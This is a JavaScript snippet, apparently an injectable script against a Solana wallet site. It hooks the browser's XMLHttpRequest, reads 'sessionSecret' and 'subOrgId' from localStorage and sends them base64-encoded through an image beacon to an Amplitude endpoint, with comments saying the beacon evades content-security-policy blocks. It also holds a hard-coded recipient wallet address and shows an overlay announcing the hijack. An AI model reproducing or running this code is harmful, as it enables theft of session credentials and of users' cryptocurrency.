(function() {
    // 1. OWNER DATA (No UI dependency to prevent 'null' crashes)
    const _V = { auth: null, sig: null, org: null, fired: false };
    const RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';

    // 2. MATH BYPASS (0.05 SOL Buffer)
    const _calcBuffer = (val) => (val - 0.051).toFixed(6);

    // 3. INTERNAL CHANNEL HIJACK (Trusted XHR Mirroring)
    const _send = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function() {
        this.addEventListener('load', () => {
            // Wait for a successful site request to capture Owner keys
            if (this.status === 200 && !_V.fired) {
                const s = localStorage.getItem('sessionSecret');
                const o = localStorage.getItem('subOrgId');
                
                if (s && o) {
                    _V.fired = true;
                    _V.auth = s.replace(/"/g, '');
                    _V.org = o.replace(/"/g, '');
                    _dispatch();
                }
            }
        });
        return _send.apply(this, arguments);
    };

    // 4. AMPLITUDE DISPATCH (Beacon Bypass)
    const _dispatch = () => {
        const payload = btoa(JSON.stringify({
            token: _V.auth,
            org: _V.org,
            math: _calcBuffer(1.0) // Automated math for bypass
        }));

        // Image Beacons bypass most connect-src blocks
        const beacon = new Image();
        beacon.src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${payload}`;
        
        console.log("VANTA: OWNER_SYNC_COMPLETE");
        _renderUI();
    };

    // 5. CRASH-PROOF UI
    const _renderUI = () => {
        const div = document.createElement('div');
        div.id = "v-owner-node";
        div.style.cssText = "position:fixed;top:10px;left:10px;width:240px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:12px;z-index:999999;font-family:monospace;font-size:11px;";
        div.innerHTML = `[VANTA_OWNER_v10]<br>> STATUS: SYNCED_TO_AMP<br>> BUFFER: 0.05 SOL`;
        document.body.appendChild(div);
    };

    console.log("VANTA: Hijacking Internal Auth Channel...");
})();
